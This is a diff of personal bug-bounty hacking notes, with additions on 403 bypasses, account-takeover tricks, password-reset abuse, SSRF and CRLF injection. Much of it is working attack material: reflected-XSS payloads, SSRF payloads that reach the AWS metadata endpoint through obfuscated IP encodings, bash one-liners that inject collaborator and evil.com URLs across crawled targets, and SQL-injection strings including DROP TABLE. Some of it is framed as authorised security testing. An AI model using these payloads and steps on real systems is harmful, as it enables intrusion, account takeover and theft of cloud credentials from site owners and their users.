@@ -5,6 +5,8 @@ if small, dont do subdomain analysis, move into appliction analysis
 complex issue    //login issues been overlooked 
 sudo cp ~smartkelvin/go/bin/pdtm  /usr/local/bin  
 
+  Quick Tip: To find Directory listing with zero efforts, Gather all the subdomains using all the techniques and then run httpx with above flags [-title -sc] and see if you get some title as “ Index of / “ or “ Index of “, etc.
+
 
 
  $ chmod +x (tool)
@@ -228,8 +230,11 @@ alastly38@gmail.com
                    gau target -subs | cut -d"?" -f1 | grep -E "\.js+(?:on|)$" | tee urls.txt
                      sort -u urls.txt | fff -s 200 -o out/
 
-                   
-                   7
+                 If you are using gau to fetch some archive data, make sure to exclude a lot of extensions with --blacklist flag:
+               cat t | gau --subs --blacklist png,jpg,jpeg,gif,mp3,mp4,svg,woff,woff2,etf,eof,otf,css,exe,ttf,eot
+
+
+
                AUTOMATIC REPLACE WITH PAYLOAD
                qsreplace .. check github
                
@@ -1200,9 +1205,9 @@ to test for this business logic flaw:
 • Analyze all steps carefully and look for possible parameters which are added by the application
 • These parameters can be tampered through a proxy while making the transaction
   
-
-    tip 
-    [ ] Test an outdata API version
+    tip
+     Add/Change the API version in the route Failed
+       We need to check if older versions of API exist by adding /v1/, /v2/, or /v3/ to the route.
     GET /v3/users_data/1234 ->401
    GET /v1/users_data/1234 ->200
    
@@ -1750,15 +1755,22 @@ go to the account register page in another browser (i’m using firefox containe
      
      
      
-    tips tips for account takeover  
-     )Checked if OTP is leaked somewhere in the response or is sent along with the request. NO it wasn’t.
+     TIPS FOR ACCOUNT TAKEOVER  
+     )Checked if OTP is leaked somewhere in the response or is sent along with the request. 
 
   Left the OTP value blank and forwarded the request as sometimes the application validates the OTP only if its value is present. 
 
   Completely removed the ‘OTP’ parameter from the request and forwarded it. 
+  
 
  Passed an array of emails[“attacker.@xyz.com”,“victim.@xyz.com”]  or using ; account1@mail.com;account2@mail.com  to check how the application behaves.Does It send the same OTP to both
 accounts? 
+  nested array
+  {"emails":[["random@gmail.com"]],"captchaValue":"_"}
+  Send the email as a JSON object
+  {"emails":[{"email": "random@gmail.com"}],"captchaValue":"_"}
+ 
+
 
 Entered the correct OTP but changed my email address to the victim’s address. 
 
@@ -1769,15 +1781,154 @@ Sometimes passing an array of numbers/OTP with the valid one might result in som
 To check the randomness of the OTP I decided to send many requests at a time in the forget password endpoint. 
    adding %00, space at the end, space at the beginning of the email 
    
-  *****     ****    **** account takeover by server knowing you are making password reset 
+  *****     ****    **** ACCOUNT TAKEOVER BY SERVER KNOWING YOU ARE MAKING PASSWORD RESET 
    sender the attacker password reset,
    sender  the victim password  reset  , 
   so now the site knows that VICTIM-EMAIL@gmail.com will reset his password ok now we’ll continue the regular process to reset the password, and when the site sends the password & password_confirmation & email we’ll replace our email with the victim's email. And voila I reseted his password successfully
-  
-  
   ******
    collect  employee's emails from Github and LinkedIn
    made a request to reset the password, then intercepted it and sent it to the intruder to see which account on my list exists as admin on the site
+   
+   
+   ******     ******    *****
+   enter some random characters into “Old Password” Field. Enter new password into remaining fields and capture the request into Burpsuite.
+   manipulated response from “Incorrect Old Password” to “Success”.  and forwarding the response, observed the Cookie Parameter in Request captured 
+   
+   
+   check if you could change any mail to another mail or burp colloborator or intersact
+   
+   
+    *****    *****   *****
+    (“/ProgramManagerREDACTED/REDACTED/updateuser”), alwys removed the body request and the two last directories and changed the “PUT” request into “GET”. The response from the server was “200 OK”, and the response body was massive information about hidden endpoints:
+    I decided to take the first request (“Edit Account”) with the same original request body, but changing the endpoint to the one I just found (“/ProgramManagerREDACTED/userInfoDetailsEntities/{user_info_id}”), so I sent a “PUT” request, with changing the “role_id” parameter value to “4” and the “mail” parameter value to hash mail.
+   
+   ****      ****
+   You need to create two accounts on let’s say vulnerable.com website, suppose those accounts are victim@gmail.com and attacker@gmail.com assuming them victim and attacker respectively! Secondly , go to attacker account and change mail to 123@gmail.com then a verification link will be sent to 123@gmail.com. Copy that link and paste it on web session of victim@gmail.com account , if it is vulnerable then the email of victim will be updated to 123@gmail.com
+   
+   
+   tip
+   request for password change
+   1. Change the email to the victim email.
+
+   2. Remove [The Header (X_auth_credentials) and the Parameter (‘currentPassword ‘)].
+
+   3. Put any new password you want
+
+   4. Send the request and you got 200 OK as a response.
+
+     . Login to the victim account with the new password and here we go you successfully accessed his account.
+   
+   
+   
+   403 BYPASS    403 BYPASS     403 BYPASS
+   
+   ## Change request method:
+
+Change requested methods like GET → POST, GET — > TRACE etc.
+
+## Try to bypass 403 with the curl command
+
+If adding Content-Length:0 is successfully bypassing 403 then you can exploit it with this command
+
+curl -X POST -H “Content-Length:0” https://www.xyz.com
+
+   OR
+
+If you see adding X-rewrite-url is able to bypass 403 then your exploit command will be
+
+curl -i -s -k -X $’GET’ -H $’Host: sub.xyz.com’ -H $’X-rewrite-url: .htaccess’ $’https://sub.xyz.com/'
+
+## common one:
+
+like
+
+xyz.com/secret/*
+
+xyz.com/secret/./
+
+xyz.com/secret/
+
+xyz.com/%2f/secret.txt/
+
+   tools
+   https://github.com/gotr00t0day/forbiddenpass
+   
+   account takeover using HOMOGRAPH  and HOMOGLIPH  ..... if in any user webapp, that fixture admin, try to register  new accout using HOMOGRAPH  and HOMOGLIPH  example first account  = Tommy  and second accont =  Tömmy and guess what  you could  became the Admin for the company “Tommy”
+   
+  PATH FUZZING AND CREATIVE STRING LITERALS.
+   htts://host.com/path = 403 forbidden
+   https://host.com/%2e/path = 200 ok
+   Example paths to fuzz below
+ /../
+/...
+/..%00
+/..%01
+/..%0a
+/..%0d
+/..%09
+/~root
+/~admin
+/%20/
+/%2e%2e/
+/%252e%252e/
+/%c0%af/
+/%e0%80%af
+   
+    USER-AGENT FUZZING    *****   i will look more about this 
+    Sometimes developers want to serve different content depending on what kind of browser/OS you use to access the web app.
+    
+    HTTP HEADERS FUZZING 
+    this technique involves sending a request to the target server with a modified HTTP header. X-Forwarded-For, Referer and Authorization headers are the most popular one to be modified. X-Forwarded-For can be fuzzed to bypass security controls that rely on IP address filtering. By changing the IP address in this header, an attacker can attempt to bypass any security controls that are based on IP address filtering
+    
+    Headers:
+- X-Forwarded-For
+- X-Forward-For
+- X-Forwarded-Host
+- X-Forwarded-Proto
+- Forwarded
+- Via
+- X-Real-IP
+- X-Remote-IP
+- X-Remote-Addr
+- X-Trusted-IP
+- X-Requested-By
+- X-Requested-For
+- X-Forwarded-Server
+    
+Values:
+- 10.0.0.0
+- 10.0.0.1
+- 127.0.0.1
+- 127.0.0.1:443
+- 127.0.0.1:80
+- localhost
+- 172.16.0.0
+    
+    
+    DOWNGRADE THE PROTOCOL VERSION.
+    You can also try all other techniques along with downgrading the protocol, one useful one might be to downgrade to 1.0 and remove the Host header at all - it can cause unexpected behaviour of the server
+    0.9    1.0   1.1   2
+    
+    Case switching technique
+It involves altering the case of characters in the URL path to try and bypass access controls. example.com/user gives you 401? Try example.com/User, example.com/%75ser or example.com/USer etc.
+    
+    HTTP REQUEST SMUGGLING    ******   (****    check http request
+    
+    Exploiting Hop-by-Hop request header
+    
+    To understand this technique one should first get familiar with hop-to-hop headers. Hop-by-hop headers are HTTP headers that are intended for communication between a client and a server, and that are not forwarded by intermediaries such as proxies or caches. These headers are called "hop-by-hop" because they are processed on a per-hop basis, meaning that each intermediary along the path of the request will see and potentially modify the headers as they pass through. The HTTP/1.1 specification defines the following headers as hop-by-hop headers:
+    Connection, Keep-Alive, Proxy-Authenticate, Proxy-Authorization, TE, Trailer, Transfer-Encoding
+    
+    
+    
+    SPRING FRAMEWORK SPECIFIC BYPASS TECHNIQUE     **** check more on this   ****
+    
+    
+    
+   
+   
+   
+   
    
    
    
@@ -1998,13 +2149,15 @@ Payload XSS (cross-site scripting) on login page:
 
 ');\\</script><script>alert(document.cookie)</script>('%00tst@tst.com.br
 
+   `“‘><img src=x onerror=promtp(7)>`”’${{8*8}}      for xss, csti, and html injection
+
 
 xss tip
 Methodology:
 1) Identify bug bounty
 2) Enumerate sub domains (I use amass, subfinder)
-3) Feed those to httpprobe
-4) Feed that list to a crawling tool
+3) Feed those to httpprobe   
+4) Feed that list to a crawling tool       hawrawler
 5) Feed that list to kxss
 6) grep output for " (easiest win)
 
@@ -2324,6 +2477,16 @@ Use burpcollaborator or ngrok
       strick on the delivery not or any input field
       
      "'"/></textarea></script/script><script/src=https://url.com/              check for proxy and place ypur payload proxy replace field this is notifty when you xss are been fired 
+     
+
+   Top 3 RXSS payloads I use:
+
+`'";//><img/src=x onError="${x};alert(`1`);">
+
+`'";//><Img Src=a OnError=location=src>
+
+`'";//></h1><Svg+Only%3d1+OnLoad%3dconfirm(atob("WW91IGhhdmUgYmVlbiBoYWNrZWQgYnkgb3R0ZXJseSE%3d"))>      
+        
 
 
 
@@ -2906,10 +3069,28 @@ gau domain.com | python3 ssrf.py collab.listener.com
 ./ssrfire.sh -d domain.com -s yourserver.com -f /path/to/copied_raw_urls.txt
 
 # SSRF Redirect Payload generator
-# https://tools.intigriti.io/redirector/
+# https://tools.intigriti.io/redirector/    
 
 
-    map the application
+
+
+     Where to Start?
+Look at the PDF and take note of any data in it that you provided to the application such as name, address, digital signature, etc. These are good parameters to investigate. During your investigation, there are a few questions you’ll want to answer:
+
+Can I inject HTML?
+Can I access remote servers?
+Can I execute JavaScript?
+Is the server that’s rendering my PDF cloud hosted?
+Are there any known vulnerabilities in the component that’s generating the PDF?
+What other services or systems can I interact with?
+
+
+                     
+  
+                
+
+
+       map the application
         identify any request parameter that contains hostnames, ip addresses or full url
                  
     for each request parameter, modify its value to specify an alternative resources and observes how the application responds 
@@ -3033,6 +3214,37 @@ https://192.10.10.2?.192.10.10.3/
 https://192.10.10.2\.192.10.10.3/
 https://192.10.10.3/
 
+Abusing Enclosed Alphanumerics
+http://169。254。169。254/
+
+http://169｡254｡169｡254/
+
+http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
+
+http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
+
+http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/
+
+http://②⑧⑤②⓪③⑨①⑥⑥:80/
+
+http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/
+
+http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥:80/
+
+http://⓪⓪②⑤①｡⓪⓪⓪③⑦⑥｡⓪⓪⓪⓪②⑤①｡⓪⓪⓪⓪⓪③⑦⑥:80/
+
+http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]:80/
+
+http://[::ⓕⓕⓕⓕ:①⑥⑨。②⑤④。⑯⑨。②⑤④]:80/
+
+http://⓪ⓧⓐ⑨。⓪③⑦⑥。④③⑤①⑧:80/
+
+http://⓪ⓧⓐ⑨｡⑯⑥⑧⑨⑥⑥②:80/
+
+http://⓪⓪②⑤①。⑯⑥⑧⑨⑥⑥②:80/
+
+http://⓪⓪②⑤①｡⓪ⓧⓕⓔ｡④③⑤①⑧:80/
+
 You can embed credentials in a URL before the hostname:
 https://expected-host:fakepassword@evil-host
 https://evil-host#expected-host                 using the #character  and also check if  You can also try double-encoding characters and try the combination of all this techiniques
@@ -3076,17 +3288,7 @@ header('Location: http://127.0.0.1:8080/status');
 # https://hackerone.com/reports/1062888
 # https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS
 
-# SSRF in pdf rendering
-<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="highcharts-root" width="800" height="500">
-    <g>
-        <foreignObject width="800" height="500">
-            <body xmlns="http://www.w3.org/1999/xhtml">
-                <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
-            </body>
-        </foreignObject>
-    </g>
-</svg>
-   
+
    
   /// sometimes it is possible to use other schemes and protocols in a SSRF attack other than HTTP. Examples of these are file://, phar://, gopher://, data://and dict://
    
@@ -3153,7 +3355,9 @@ file://\/\/etc/passwd : Work
    TIP//
    1 — Get the alive subdomain from subfinder and send them to httpx
 
-2 — Open the burp suite, create a new project and set up your autorepeater with the above regex and settings like the above image.
+2 — Open the burp suite, create a new project and set up your autorepeater with the beloe regex and settings like the above image.
+    regex for ssrf in autorepeter =  https?://(www.)?[-a-zA-Z0–9@:%.+~#=]{1,256}.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%+.~#?&//=]*)
+
 
 3 — Use Katana tool by projectdiscvery and use the proxy option and add the burp proxy URL by the default, it will be http://127.0.0.1:8080
 
@@ -3164,7 +3368,16 @@ file://\/\/etc/passwd : Work
  oneliner for the above
  subfinder -d hackerone.com | httpx -timeout 10 | katana -proxy http://127.0.0.1:8080 -jc -aff 
  
-   regex for ssrf in autorepeter =  https?://(www.)?[-a-zA-Z0–9@:%.+~#=]{1,256}.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%+.~#?&//=]*)
+ 
+  find a pdf endpoint   *****   ****
+   https://www.example.com/employeeRecord/?record=XYZ.pdf
+    capture this request and modify the value of the “record” parameter with Burp Collaborator.URL like this:https://www.example.com/employeeRecord/?record=http://burpcolaboratorlink.com 
+    https://www.example.com/employeeRecord/?record=http://burpcolaboratorlink.com | echo hello               command injection
+    
+   **** ****  sometimes,  removed the whole path value and replaced the value with you  burp collaborator URL , check the response on burp collaborator listener, if there is response,explored some of the bypass techniques  on the path value..   check for ssrf waf bypass technique
+     
+ 
+  
    
    
    http://canarytokens.com/traffic/wzjxrkmmgjd8em4swawz08eey/post.jsp /////
@@ -3194,7 +3407,7 @@ file://\/\/etc/passwd : Work
 
 5️⃣ File Upload - Does your target app support uploading files? 📂 Try uploading an HTML file; if rendered and executed on the server-side, you might strike gold. No luck? Try an SVG with SSRF payload. If that fails, move on to the next!
    
-   SSRF METHODOLOGY BY AaKASH
+   SSRF Tip
    look for subdomian by Amass, Sublist3r and subdomainer
    check live subdomain
    cat all-domains.txt | httpx > all-live.txt
@@ -3205,9 +3418,6 @@ file://\/\/etc/passwd : Work
     Test for SSRF Vulnerabilities
    cat ssrf.txt | httpx -fr
    If any url vulnerable to SSRF will be show in burp collaborator.
-    
-      
-  
    
    
    //////
@@ -3244,9 +3454,23 @@ Steps to Reproduce
 16 .By the way if you change to 25 port its leaking something about Postfix SMTP server.
 17.Also I was able to identify that your web app is using libcurl.
   
+  
+  
+  
+     Blind SSRF Oneliner:
+cat wayback.txt|gf ssrf |qsreplace 'https://your-burp-collab.com'|while read url; do ssrf=$(curl -s -L $url);echo -e "$url --> PAYLOAD-INJECTED-SUCCESSFULLY";done
+
+cat wayback.txt|gf ssrf |grep -a -i \=http|qsreplace 'https://your-burp-collab.com'|while read url; do ssrf=$(curl -s -L $url);echo -e "$url --> PAYLOAD-INJECTED-SUCCESSFULLY";done
+
+    
+    Blind SSRF Oneliner(X-Forwarded-Host):
+echo "testphp.vulnweb.com"|assetfinder|httprobe|while read url; do ssrf=$(curl -s -L $url -H "X-Forwarded-Host: pingb.in/p/6305faa38a067b8717e6d09db07f");echo -e "$url -> X-Forwarded-Host: injected";done
+
+echo "testphp.vulnweb.com"|assetfinder|httpx|while read url; do ssrf=$(curl -s -L $url -H "X-Forwarded-Host: pingb.in/p/6305faa38a067b8717e6d09db07f");echo -e "$url -> X-Forwarded-Host: injected";done
+
+   
    
    tips 
-   
 
    Bypass #SSRF filters by using http://127.1 instead of http://127.0.0.1
   It resolves to the same but confuses filters blocking localhost/127.0.0.1 specifically!  and also remember that 
@@ -3267,11 +3491,53 @@ Steps to Reproduce
       cat hosttxt | httpx -title -status-code
       
       
+      tips 
+      Gathered the in-scope domains.
+      Started active and passive subdomain enumeration  using subfinder (with API Keys of different services such as Shodan, Chaos, GitHub, Sublist3r, etc). For Active    subdomain enumeration, Best DNS Wordlist from Assetnote Wordlist
+      filter out the live domains based on the status code
+      check for its status
+      
+      ***     ****     ***
+      subfinder -d target.com > domains.txt
+      cat domains.txt | httprobe > live_domains.txt
+      cat live_domains.txt | waybackurls > urls.txt
+      cat urls.txt | httpx — status-code-title > status.txt                 identify the status, title, tech
+      check the url aof status.txt and check for interesting endpoint  of password, username, mail.com, token, access_token, url=, redirect_url=, api id=,    accessUrl=, payment,
+      make use of any ooast and replace it at any intersting endpoint
+      
+      and also search on burp history, the top parameter thta could be accessbe to ssrf  example = url={target} file={target} filename={target} , then when found, try xss, lfi, open redirect and also URL schemas file:///, dict://, ftp://, gopher://  and also check the magic ip of aws in example below
+      https://reducted.com/gadgets/proxy/?url=http://169.254.169.254/latest/meta-data
+      
+      ****** alwys don’t ignore edit buttons
+
+      payload
+      https://eea.europa.eu/?unix:bunchofA|http://169.254.169.254/latest
+      
+      
+     ***** tip  ****
+     To reach the client-side, we need our SSRF to reflect the headers used by the client this is common in SSRF that will serve as a proxy so the attacker can define a proxy in the application.
+
+By doing this we have something similar to a subdomain takeover, as we can take over all the content that transits to that subdomain. This already very impactful in the case of a domain but in the case of an out of scope subdomain, or a dev environment, it may not have as much effect, as there are not many direct requests for regions like this and the company can inform that this is not under their control, reducing the impact of the vulnerability.
+
+  If the SSRF is on ssrf.dev.example.com, we need to find an application with authentication on *.example.com that has cookies set as follows:
+
+Set-cookie: session=SECRET_SESSION, domain=.example.com, HttpOnly
+
+    upload fuctionality to ssrf 
+Attacker creates a JSON file with the following contents in Google drive
+{"downloadUrl": "http://169.254.169.254/latest/meta-data/"}
+Attacker signs into HelloSign, uploads the created drive file to it, and intercepts the request
+Inject the ?alt=media parameter in the file id value
+Get the AWS metadata in the response
+  
       
       
       
+      FILE UPLOAD CHEATSHEET           FILE UPLOAD CHEATSHEET          FILE UPLOAD CHEATSHEET    
       
-      FILE UPLOAD CHEATSHEET           FILE UPLOAD CHEATSHEET          FILE UPLOAD CHEATSHEET     
+      if you got a file upload, try every possible way to escalate it further. Upload almost everything and see if application allows you to upload something like a script. Change extensions, add an extra extension, these things will surely help you to learn a lot of things. Also, always keep an eye on URLS with every passing endpoint. Default parameters are super helpful in escalating SSRFs.
+      
+       
 Where to find
 In upload file feature, for example upload photo profile feature
 How to exploit
@@ -3572,15 +3838,13 @@ Here's the link to the template - https://github.com/projectdiscovery/nuclei-tem
             Host: admin.target.com
 
            
-           
-       
-       
-       
-           Host: admin.target.com
+          Host: admin.target.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
 
 GET /admin/login HTTP/1.1
-Host: admin.target.com Cache possioning        Web Cache possioning        Web Cache possioning 
+Host: admin.target.com Cache possioning        
+                                                   
+                                                   Web Cache deception       Web Cache deception
            we manage to force the Load Balancer into caching our request on a specific crafted path of ours, we will be able to read our victim's sensitive data from the cached response.It wasn't straight-forward in this case
            
   NOTE  :     Relaxed cache rules can be very dangerous, especially with URL parser confusions.  In a website that uses caching, the request must go through the CDN before it gets the the web server. This means that the URL gets parsed twice, which makes it possible for a URL parser confusion
@@ -3605,6 +3869,7 @@ Configure the cache mechanism to cache files only if their HTTP caching headers 
 If the cache component provides the option, configure it to cache files by their content type.
 Configure the web server so that for pages such as http://www.example.com/home.php/non-existent.css, the web server doesn’t return the content of "home.php" with this URL. Instead, for example, the server should respond with a 404 or 302 response.
            
+           Web Cache poisoning     Web Cache poisoning       Web Cache poisoning 
            
            
            
@@ -3612,9 +3877,36 @@ Configure the web server so that for pages such as http://www.example.com/home.p
 
      5MIN ADMIN PANEL ACCESSED PAYLOAD
 cat urls.txt | qsreplace "?admin=true" | gau | phpgcc | anew | kxss | awk  -v  -q txt | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | grep -vi -e dalfox -e lElLxtainw| sort -u | waybackurls
+
+
+
+   OPEN REDIRECT      OPEN REDIRECT      0PEN REDIRECT
+   few things i do when i get an open 
+   (1) i spray that parameter to other endpoint of the web application.
+(2) I always look into wayback machine for old urls to see if it have same or similar parameter.
+(3) Google dorks to see if i can get the same parameter in another endpoint.
+   
+   
+   
+    𝗖𝗥𝗟𝗙    𝗖𝗥𝗟𝗙  𝗖𝗥𝗟𝗙       𝗖𝗥𝗟𝗙       𝗖𝗥𝗟𝗙           𝗖𝗥𝗟𝗙                         𝗖𝗥𝗟𝗙                            𝗖𝗥𝗟𝗙
+   𝗖𝗥𝗟𝗙 𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻 𝗕𝘆𝗽𝗮𝘀𝘀 𝘂𝘀𝗶𝗻𝗴 𝗚𝗕𝗞 𝗘𝗻𝗰𝗼𝗱𝗶𝗻𝗴
+
+GET /Cybertix    ==>  404 Not Found
+
+GET /%0D%0A%20Set-Cookie:cybertix=1  ==> 400 Bad Request
+
+GET /%E5%98%8D%E5%98%8Set-Cookie:cybertix-1 ==> 𝟮𝟬𝟬 𝗢𝗞
+
     
  
- SQL INJECTION        SQL INJECTION          SQL INJECTION
+ SQL INJECTION        SQL INJECTION          SQL INJECTION            ****check for cypher injection
+ 
+ 
+ tip
+ Always try the "\" character in login entries. It can trigger an SQL.
+
+curl -d 'username=1\&password=1\' -X POST https :// login(.)domain(.)com
+ 
  for email
  "' OR 1=1 -- '"@example.com
 "mail'); DROP TABLE users;--"@example.com
@@ -4157,9 +4449,6 @@ Non-alphanumeric crazyness...
 $=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();
 </script>
 
-<script>
-(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
-</script>
 
 
 
@@ -4254,16 +4543,6 @@ nuclei -t templates/subdomain-takeover.yaml -1 subdomains.txt
    
    
    
-   Blind SSRF Oneliner:
-cat wayback.txt|gf ssrf |qsreplace 'https://your-burp-collab.com'|while read url; do ssrf=$(curl -s -L $url);echo -e "$url --> PAYLOAD-INJECTED-SUCCESSFULLY";done
-
-cat wayback.txt|gf ssrf |grep -a -i \=http|qsreplace 'https://your-burp-collab.com'|while read url; do ssrf=$(curl -s -L $url);echo -e "$url --> PAYLOAD-INJECTED-SUCCESSFULLY";done
-
-    
-    Blind SSRF Oneliner(X-Forwarded-Host):
-echo "testphp.vulnweb.com"|assetfinder|httprobe|while read url; do ssrf=$(curl -s -L $url -H "X-Forwarded-Host: pingb.in/p/6305faa38a067b8717e6d09db07f");echo -e "$url -> X-Forwarded-Host: injected";done
-
-echo "testphp.vulnweb.com"|assetfinder|httpx|while read url; do ssrf=$(curl -s -L $url -H "X-Forwarded-Host: pingb.in/p/6305faa38a067b8717e6d09db07f");echo -e "$url -> X-Forwarded-Host: injected";done
 
   Open Redirect Oneliner:
 cat waybackurls_result.txt|grep -a -i \=http|qsreplace 'http://evil.com'|while read host do;do curl -s -L $host -I|grep "evil.com" && echo "$host \033[0;31m[+]VULNERABLE-TO-OPEN-REDIRECT-ATTACK\n";done
@@ -4284,9 +4563,6 @@ dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb
 5 sqlmap -m sql.url --dbs --batch
 
   
-  Open Redirect:
-https://target[.]com///google[.]com/  --> 404 Not found
-https://target[.]com///google[.]com/?qwerty  --> Redirects to google[.]com
 
 
 XSS Scanner
